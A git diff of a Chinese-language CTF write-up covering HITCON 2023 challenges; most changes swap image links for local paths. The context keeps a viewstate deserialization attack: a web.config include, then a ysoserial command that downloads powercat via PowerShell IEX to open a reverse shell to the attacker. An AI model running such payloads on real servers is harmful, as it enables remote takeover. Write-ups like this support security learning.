@@ -16,11 +16,11 @@ hidden: false
     <!--#include file="..\..\web.config" -->
     ```
 
-    ![](https://i.imgur.com/6MBqfic.png)
+    ![](/images/2023/08/6MBqfic.png)
 
  - 取得validationKey
 
-   ![](https://i.imgur.com/dslQNTw.png)
+   ![](/images/2023/08/dslQNTw.png)
 
 
  - 下載[ysoserial Github](https://github.com/pwntester/ysoserial.net/releases/tag/master-Release-29)
@@ -31,9 +31,9 @@ hidden: false
     .\ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c {your IP} -p 5278 -e cmd" -o base64
     ```
 
-    ![](https://i.imgur.com/ozpv4xN.png)
+    ![](/images/2023/08/ozpv4xN.png)
 
- - 使用python將serialized_data加上validation_key 
+ - 使用python將serialized_data加上validation_key
 
     ```python
     import base64
@@ -47,49 +47,49 @@ hidden: false
     print(payload)
     ```
 
-    ![](https://i.imgur.com/ChkZszk.png)
+    ![](/images/2023/08/ChkZszk.png)
 
 - 送出viewstate
 
-    ![](https://i.imgur.com/NvVFesp.png)
+    ![](/images/2023/08/NvVFesp.png)
 
 - 取得reverse shell
 
-    ![](https://i.imgur.com/7G8DaPk.png)
+    ![](/images/2023/08/7G8DaPk.png)
 
-    ![](https://i.imgur.com/8CxJuEw.png)
+    ![](/images/2023/08/8CxJuEw.png)
 
 
 ### papapa
 
 - 憑證domain (很可疑~)
-    ![](https://i.imgur.com/ffeOVhU.png)
+    ![](/images/2023/08/ffeOVhU.png)
 
 - 內文
-    ![](https://i.imgur.com/4BG0qv6.png)
+    ![](/images/2023/08/4BG0qv6.png)
 
 - 修改Host (讓它連線到flag站台)
-    ![](https://i.imgur.com/FRunn6N.png)
+    ![](/images/2023/08/FRunn6N.png)
 
 
 ### yeeclass
 
  - 查看公開的submissions
- 
-    ![](https://i.imgur.com/FxEUkbA.png)
+
+    ![](/images/2023/08/FxEUkbA.png)
 
  - 發現homeworkid=1沒有權限查看
- 
-    ![](https://i.imgur.com/IerSHSy.png)
-    
+
+    ![](/images/2023/08/IerSHSy.png)
+
  - 使用未登入帳號繞過
-    ![](https://i.imgur.com/gr87wSM.png)
- 
+    ![](/images/2023/08/gr87wSM.png)
+
  - 自己發個測試，貼文規則為
      ```
      http://rectf.hitcon2023.online:30203/submission.php?hash=sha1(username_{timestamp}{microseconds})
      ```
-      ![](https://i.imgur.com/bzzpkt3.png)
+      ![](/images/2023/08/bzzpkt3.png)
 
  - 所以flag應該為
      ```
@@ -114,7 +114,7 @@ hidden: false
     ```
  - 結果
 
-    ![](https://i.imgur.com/a62bwvr.png)
+    ![](/images/2023/08/a62bwvr.png)
 
 
 ## Misc
@@ -125,18 +125,18 @@ hidden: false
     ```bash
     xxd unreadable-4b2868cc26a8dad5695e537a9dd8a164
     ```
-    ![](https://i.imgur.com/zde8mKK.png)
+    ![](/images/2023/08/zde8mKK.png)
 
 - 縮小
 
-    ![](https://i.imgur.com/6uz0rPN.png)
+    ![](/images/2023/08/6uz0rPN.png)
 
 
 ### fbi-warning
 
 - 取得ID和時間 ( ID: E98SXRsI / 時間:20211203 )
 
-    ![](https://i.imgur.com/dwtynvX.png)
+    ![](/images/2023/08/dwtynvX.png)
 
  - futaba.php存在預設seed (idの種) 和id生成的方法
 
@@ -161,8 +161,7 @@ hidden: false
 
 - 執行php
 
-    ![](https://i.imgur.com/x2xN5UT.png)
+    ![](/images/2023/08/x2xN5UT.png)
 
 ## The End
-![](https://i.imgur.com/RvQMBEr.png)
-
+![](/images/2023/08/RvQMBEr.png)
